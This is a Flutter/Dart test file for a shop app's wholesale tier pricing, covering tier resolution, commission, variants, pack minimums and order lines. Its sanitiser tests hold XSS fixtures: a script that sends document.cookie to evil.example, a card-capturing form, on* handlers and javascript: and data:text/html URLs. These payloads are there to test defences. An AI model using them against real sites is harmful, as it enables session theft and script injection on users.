import 'package:customer/constant/constant.dart';
import 'package:customer/models/admin_commission_model.dart';
import 'package:customer/models/cart_product_model.dart';
import 'package:customer/models/product_model.dart';
import 'package:customer/models/section_model.dart';
import 'package:customer/models/vendor_model.dart';
import 'package:customer/utils/wholesale_pricing.dart';
import 'package:flutter_test/flutter_test.dart';

/// The resolution rule of WEB spec §10 / STORE spec §3, which this app has to
/// share with the website to the last unit:
///
///   unit(q) = the HIGHEST tier where q >= minQty AND tier.price < retail,
///             else retail
///
/// The client's own three tiers (15 / 3,500, 100 / 2,500, 500 / 2,000 against
/// a retail of 4,000) are the worked example of the spec, so they are the
/// worked example here.
void main() {
  // The tiers as the panel may post them: out of order, and carrying the junk
  // rows `normaliseWholesaleTiers()` drops (no quantity, blank price).
  List<WholesaleTier> clientTiers() => WholesaleTier.parseList([
    {'minQty': '100', 'price': '2500'},
    {'minQty': '500', 'price': '2000'},
    {'minQty': '15', 'price': '3500'},
  ]);

  double unit(int qty, {double retail = 4000, List<WholesaleTier>? tiers}) => LinePrice.resolve(retail: retail, tiers: tiers ?? clientTiers(), quantity: qty).unit;

  group('tier resolution - the client\'s three tiers, posted out of order', () {
    test('the list is sorted on arrival, whatever order it arrived in', () {
      expect(clientTiers().map((t) => t.minQtyValue).toList(), [15, 100, 500]);
    });

    test('1-14 pay retail', () {
      expect(unit(1), 4000);
      expect(unit(14), 4000);
    });

    test('15-99 pay tier one', () {
      expect(unit(15), 3500);
      expect(unit(99), 3500);
    });

    test('100-499 pay tier two', () {
      expect(unit(100), 2500);
      expect(unit(499), 2500);
    });

    test('500+ pay tier three', () {
      expect(unit(500), 2000);
      expect(unit(5000), 2000);
    });

    test('every boundary, 14/15 - 99/100 - 499/500', () {
      expect([unit(14), unit(15)], [4000, 3500]);
      expect([unit(99), unit(100)], [3500, 2500]);
      expect([unit(499), unit(500)], [2500, 2000]);
    });

    test('the line carries the tier it is charged at', () {
      final LinePrice p = LinePrice.resolve(retail: 4000, tiers: clientTiers(), quantity: 120);
      expect(p.isWholesale, isTrue);
      expect(p.minQty, '100');
      expect(p.unit, 2500);
    });
  });

  group('downwards as well', () {
    test('a line taken to 500 and dropped to 5 is back at retail', () {
      expect(unit(500), 2000);
      expect(unit(5), 4000);
      expect(LinePrice.resolve(retail: 4000, tiers: clientTiers(), quantity: 5).isWholesale, isFalse);
    });

    test('and back up again, without having stuck anywhere', () {
      expect([unit(500), unit(5), unit(120), unit(14), unit(15)], [2000, 4000, 2500, 4000, 3500]);
    });
  });

  group('the cheaper-than-retail test is per tier, not a blanket skip', () {
    // A discount of 3,000 on the same product: tier one is not cheaper, so it
    // is skipped - while the deeper tiers still apply.
    test('20 units pay the discount, not tier one', () {
      expect(unit(20, retail: 3000), 3000);
      expect(LinePrice.resolve(retail: 3000, tiers: clientTiers(), quantity: 20).isWholesale, isFalse);
    });

    test('120 units still pay tier two and 600 still pay tier three', () {
      expect(unit(120, retail: 3000), 2500);
      expect(unit(600, retail: 3000), 2000);
    });

    test('a deeper tier that is dearer than retail never hides a cheaper one', () {
      // The failure of "take the highest tier reached, then clamp to retail":
      // at 120 units tier two is above retail, but tier one is below it.
      final List<WholesaleTier> tiers = WholesaleTier.parseList([
        {'minQty': '15', 'price': '3500'},
        {'minQty': '100', 'price': '4500'},
      ]);
      expect(unit(120, tiers: tiers), 3500);
      expect(unit(20, tiers: tiers), 3500);
    });

    test('no tier cheaper than retail = retail', () {
      expect(unit(600, retail: 1500), 1500);
    });
  });

  group('rows the panel may post but nothing may price', () {
    test('a row with no quantity or a blank price is dropped', () {
      final List<WholesaleTier> tiers = WholesaleTier.parseList([
        {'minQty': '', 'price': '2500'},
        {'minQty': '100', 'price': ''},
        {'price': '900'},
        {'minQty': '50'},
        {'minQty': '15', 'price': '3500'},
      ]);
      expect(tiers.where((t) => t.isUsable).map((t) => t.minQtyValue).toList(), [15]);
      expect(unit(200, tiers: tiers), 3500);
    });

    test('a quantity of one is not a wholesale tier', () {
      final List<WholesaleTier> tiers = WholesaleTier.parseList([
        {'minQty': '1', 'price': '3500'},
      ]);
      expect(unit(50, tiers: tiers), 4000);
    });

    test('an empty list is retail at any quantity', () {
      expect(unit(10000, tiers: const <WholesaleTier>[]), 4000);
    });
  });

  group('the legacy pair', () {
    test('a product with no tier list is a product with one tier', () {
      final ProductModel product = ProductModel.fromJson({'id': 'p1', 'price': '150', 'disPrice': '0', 'wholesaleEnabled': true, 'wholesalePrice': '120', 'wholesaleMinQty': '10'});
      expect(product.activeWholesaleTiers.length, 1);
      expect(product.activeWholesaleTiers.first.minQtyValue, 10);
      expect(LinePrice.resolve(retail: 150, tiers: product.activeWholesaleTiers, quantity: 9).unit, 150);
      expect(LinePrice.resolve(retail: 150, tiers: product.activeWholesaleTiers, quantity: 10).unit, 120);
    });

    test('the pair wins tier one when the two disagree', () {
      final ProductModel product = ProductModel.fromJson({
        'id': 'p2',
        'price': '4000',
        'wholesaleEnabled': true,
        'wholesalePrice': '3400',
        'wholesaleMinQty': '15',
        'wholesaleTiers': [
          {'minQty': '500', 'price': '2000'},
          {'minQty': '15', 'price': '3500'},
        ],
      });
      expect(product.activeWholesaleTiers.map((t) => '${t.minQty}/${t.price}').toList(), ['15/3400', '500/2000']);
    });

    test('wholesale off = no tiers at all', () {
      final ProductModel product = ProductModel.fromJson({'id': 'p3', 'price': '150', 'wholesalePrice': '120', 'wholesaleMinQty': '10'});
      expect(product.activeWholesaleTiers, isEmpty);
    });
  });

  group('the next tier up', () {
    test('below the entry tier it is the entry tier', () {
      final WholesaleTier? next = LinePrice.nextTier(tiers: clientTiers(), quantity: 1, currentUnit: 4000);
      expect(next?.minQtyValue, 15);
    });

    test('on a tier it is the one above', () {
      final WholesaleTier? next = LinePrice.nextTier(tiers: clientTiers(), quantity: 15, currentUnit: 3500);
      expect(next?.minQtyValue, 100);
    });

    test('on the deepest tier there is nothing left to offer', () {
      expect(LinePrice.nextTier(tiers: clientTiers(), quantity: 500, currentUnit: 2000), isNull);
    });

    test('a tier that is not actually cheaper than what is paid now is suppressed', () {
      final List<WholesaleTier> tiers = WholesaleTier.parseList([
        {'minQty': '15', 'price': '3500'},
        {'minQty': '100', 'price': '3600'},
      ]);
      expect(LinePrice.nextTier(tiers: tiers, quantity: 20, currentUnit: 3500), isNull);
    });
  });

  group('the admin commission is on every tier', () {
    setUp(() {
      Constant.sectionConstantModel = SectionModel(adminCommision: AdminCommission(isEnabled: true, amount: '15', commissionType: 'Percent'));
    });
    tearDown(() => Constant.sectionConstantModel = null);

    final VendorModel vendor = VendorModel(id: 'v1');

    test('the Veggie Burger of the spec: 172.50 retail, 138.00 from ten', () {
      final ProductModel product = ProductModel.fromJson({'id': 'p4', 'price': '150', 'disPrice': '0', 'wholesaleEnabled': true, 'wholesalePrice': '120', 'wholesaleMinQty': '10'});
      final double retail = WholesalePricing.retailPrice(product, vendor);
      final List<WholesaleTier> tiers = WholesalePricing.customerTiers(product, vendor);
      expect(retail, closeTo(172.5, 0.001));
      expect(LinePrice.resolve(retail: retail, tiers: tiers, quantity: 9).unit, closeTo(172.5, 0.001));
      expect(LinePrice.resolve(retail: retail, tiers: tiers, quantity: 10).unit, closeTo(138, 0.001));
    });

    test('every tier of a ladder carries it, the deepest included', () {
      final ProductModel product = ProductModel.fromJson({
        'id': 'p5',
        'price': '4000',
        'wholesaleEnabled': true,
        'wholesaleTiers': [
          {'minQty': '500', 'price': '2000'},
          {'minQty': '15', 'price': '3500'},
          {'minQty': '100', 'price': '2500'},
        ],
      });
      final List<WholesaleTier> tiers = WholesalePricing.customerTiers(product, vendor);
      expect(tiers.map((t) => t.priceValue).toList(), [4025, 2875, 2300]);
      final double retail = WholesalePricing.retailPrice(product, vendor);
      expect(retail, closeTo(4600, 0.001));
      // 15 / 4,025 is still under the commission-inclusive retail of 4,600.
      expect(LinePrice.resolve(retail: retail, tiers: tiers, quantity: 20).unit, closeTo(4025, 0.001));
      expect(LinePrice.resolve(retail: retail, tiers: tiers, quantity: 500).unit, closeTo(2300, 0.001));
    });

    test('a wholesale price that is not cheaper is ignored - buying more never costs more', () {
      // disPrice 110 (126.50) against a wholesale price of 120 (138.00).
      final ProductModel product = ProductModel.fromJson({'id': 'p6', 'price': '150', 'disPrice': '110', 'wholesaleEnabled': true, 'wholesalePrice': '120', 'wholesaleMinQty': '10'});
      final double retail = WholesalePricing.retailPrice(product, vendor);
      expect(retail, closeTo(126.5, 0.001));
      expect(LinePrice.resolve(retail: retail, tiers: WholesalePricing.customerTiers(product, vendor), quantity: 10).unit, closeTo(126.5, 0.001));
    });
  });

  group('variants', () {
    setUp(() {
      Constant.sectionConstantModel = SectionModel(adminCommision: AdminCommission(isEnabled: false, amount: '0', commissionType: 'Percent'));
    });
    tearDown(() => Constant.sectionConstantModel = null);

    final VendorModel vendor = VendorModel(id: 'v1');

    Map<String, dynamic> productWithVariant(Map<String, dynamic> variant) => {
      'id': 'p7',
      'price': '4000',
      'wholesaleEnabled': true,
      'wholesaleTiers': [
        {'minQty': '15', 'price': '3500'},
        {'minQty': '100', 'price': '2500'},
        {'minQty': '500', 'price': '2000'},
      ],
      'item_attribute': {
        'attributes': [],
        'variants': [
          {'variant_id': 'v-a', 'variant_price': '4200', 'variant_sku': 'A', ...variant},
        ],
      },
    };

    test("a variant's own wholesale price REPLACES the product's tiers", () {
      final ProductModel product = ProductModel.fromJson(productWithVariant({'variant_wholesale_price': '3800'}));
      final List<WholesaleTier> tiers = WholesalePricing.customerTiers(product, vendor, variantId: 'v-a');
      expect(tiers.length, 1);
      expect(tiers.first.minQtyValue, 15);
      expect(tiers.first.priceValue, 3800);
      // 600 units of the variant pay its one price, never the product's 2,000.
      expect(LinePrice.resolve(retail: 4200, tiers: tiers, quantity: 600).unit, 3800);
    });

    test('with its own threshold, that one price sits at that threshold', () {
      final ProductModel product = ProductModel.fromJson(productWithVariant({'variant_wholesale_price': '3800', 'wholesaleMinQty': '25'}));
      final List<WholesaleTier> tiers = WholesalePricing.customerTiers(product, vendor, variantId: 'v-a');
      expect(tiers.length, 1);
      expect(tiers.first.minQtyValue, 25);
      expect(LinePrice.resolve(retail: 4200, tiers: tiers, quantity: 24).unit, 4200);
      expect(LinePrice.resolve(retail: 4200, tiers: tiers, quantity: 25).unit, 3800);
    });

    test('a variant carrying none of the fields keeps the product ladder', () {
      final ProductModel product = ProductModel.fromJson(productWithVariant({}));
      final List<WholesaleTier> tiers = WholesalePricing.customerTiers(product, vendor, variantId: 'v-a');
      expect(tiers.map((t) => t.minQtyValue).toList(), [15, 100, 500]);
      expect(LinePrice.resolve(retail: 4200, tiers: tiers, quantity: 500).unit, 2000);
    });

    test('an EXPLICIT wholesaleEnabled: false makes that variant retail-only', () {
      final ProductModel product = ProductModel.fromJson(productWithVariant({'wholesaleEnabled': false}));
      expect(WholesalePricing.customerTiers(product, vendor, variantId: 'v-a'), isEmpty);
      // The product-level line is untouched.
      expect(WholesalePricing.customerTiers(product, vendor).length, 3);
    });

    test('an absent wholesaleEnabled is no opinion, not a false', () {
      final ProductModel product = ProductModel.fromJson(productWithVariant({'wholesaleEnabled': ''}));
      expect(WholesalePricing.customerTiers(product, vendor, variantId: 'v-a').length, 3);
    });
  });

  group('saleType and the pack floor', () {
    setUp(() {
      Constant.sectionConstantModel = SectionModel(adminCommision: AdminCommission(isEnabled: false, amount: '0', commissionType: 'Percent'));
    });
    tearDown(() => Constant.sectionConstantModel = null);

    final VendorModel vendor = VendorModel(id: 'v1');

    Map<String, dynamic> ladder(String? saleType) => {
      'id': 'p8',
      'price': '4000',
      'wholesaleEnabled': true,
      if (saleType != null) 'saleType': saleType,
      'wholesaleTiers': [
        {'minQty': '15', 'price': '3500'},
        {'minQty': '100', 'price': '2500'},
        {'minQty': '500', 'price': '2000'},
      ],
    };

    test('absent, empty and unrecognised all read as "both"', () {
      for (final dynamic value in [null, '', '  ', 'nonsense', 'BOTH', 'retail']) {
        final ProductModel product = ProductModel.fromJson(ladder(value as String?));
        expect(product.effectiveSaleType, isNot(ProductModel.saleTypeWholesale), reason: 'saleType $value');
        expect(product.isWholesaleOnly, isFalse, reason: 'saleType $value');
        expect(WholesalePricing.minOrderQuantityFor(product, vendor), 1, reason: 'saleType $value');
      }
    });

    test('"wholesale" is not sold singly, and the floor is the ENTRY tier', () {
      final ProductModel product = ProductModel.fromJson(ladder('wholesale'));
      expect(product.isWholesaleOnly, isTrue);
      expect(WholesalePricing.minOrderQuantityFor(product, vendor), 15);
    });

    test('"Wholesale" in any case is still wholesale', () {
      final ProductModel product = ProductModel.fromJson(ladder('Wholesale'));
      expect(product.isWholesaleOnly, isTrue);
    });

    test('a wholesale-only product with no usable tier keeps a floor of one', () {
      final ProductModel product = ProductModel.fromJson({'id': 'p9', 'price': '4000', 'wholesaleEnabled': true, 'saleType': 'wholesale'});
      expect(product.isWholesaleOnly, isFalse);
      expect(WholesalePricing.minOrderQuantityFor(product, vendor), 1);
    });
  });

  group('wholesaleDetails is sanitised before it is rendered', () {
    test('script, iframe, object, embed, link, style and form tags go', () {
      const String raw = '''
        <p>Pack of 10</p>
        <script>fetch('https://evil.example/'+document.cookie)</script>
        <iframe src="https://evil.example"></iframe>
        <object data="x.swf"></object><embed src="x.swf">
        <link rel="stylesheet" href="https://evil.example/x.css">
        <style>body{display:none}</style>
        <form action="https://evil.example"><input name="card"></form>
      ''';
      final String safe = WholesalePricing.safeDetailsHtml(raw);
      for (final String tag in ['script', 'iframe', 'object', 'embed', 'link', 'style', 'form']) {
        expect(safe.toLowerCase(), isNot(contains('<$tag')));
      }
      expect(safe, contains('Pack of 10'));
      expect(safe.toLowerCase(), isNot(contains('evil.example/x.css')));
    });

    test('every on* handler goes, quoted or not', () {
      final String safe = WholesalePricing.safeDetailsHtml('<div onclick="steal()" ONMOUSEOVER=\'go()\' onload=go()>10 units</div>');
      expect(safe.toLowerCase(), isNot(contains('onclick')));
      expect(safe.toLowerCase(), isNot(contains('onmouseover')));
      expect(safe.toLowerCase(), isNot(contains('onload')));
      expect(safe, contains('10 units'));
    });

    test('javascript: URLs go, however they are spelled', () {
      final String safe = WholesalePricing.safeDetailsHtml('<a href="javascript:alert(1)">terms</a><img src=javascript:alert(2)>');
      expect(safe.toLowerCase(), isNot(contains('javascript:')));
      expect(safe, contains('terms'));
    });

    test('an inline image survives, a data: document does not', () {
      final String safe = WholesalePricing.safeDetailsHtml('<img src="data:image/png;base64,AAA"><a href="data:text/html,<script>x()</script>">terms</a>');
      expect(safe, contains('data:image/png'));
      expect(safe.toLowerCase(), isNot(contains('data:text/html')));
    });

    test('a price table - the point of the field - survives', () {
      const String table = '<table><tr><th>Qty</th><th>Price</th></tr><tr><td>15+</td><td>3 500</td></tr></table>';
      expect(WholesalePricing.safeDetailsHtml(table), table);
    });

    test('null, empty and blank are nothing at all', () {
      expect(WholesalePricing.safeDetailsHtml(null), '');
      expect(WholesalePricing.safeDetailsHtml(''), '');
      expect(WholesalePricing.safeDetailsHtml('   \n '), '');
    });
  });

  group('the order line a panel reads back', () {
    setUp(() {
      Constant.sectionConstantModel = SectionModel(adminCommision: AdminCommission(isEnabled: false, amount: '0', commissionType: 'Percent'));
    });
    tearDown(() => Constant.sectionConstantModel = null);

    CartProductModel line(int quantity) => CartProductModel(
      id: 'p1',
      price: '4000',
      discountPrice: '0',
      quantity: quantity,
      lineMeta: CartLineMeta(tiers: clientTiers(), saleType: ProductModel.saleTypeBoth, minOrderQty: 1, fulfilment: const ['delivery', 'takeaway']),
    );

    test('the whole line is repriced, never only the units past the threshold', () {
      expect(line(500).chargedUnitPrice * 500, 1000000);
      expect(line(120).chargedUnitPrice * 120, 300000);
    });

    test('the written line carries the charged price and the tier applied', () {
      final CartProductModel order = line(120).toOrderLine();
      expect(order.price, '2500');
      expect(order.isWholesale, isTrue);
      expect(order.wholesaleMinQty, '100');
      expect(order.unitPrice, 2500);
    });

    test('a retail line is written exactly as before', () {
      final CartProductModel order = line(5).toOrderLine();
      expect(order.price, '4000');
      expect(order.isWholesale, isFalse);
      expect(order.wholesaleMinQty, '');
      expect(order.unitPrice, 4000);
    });
  });
}
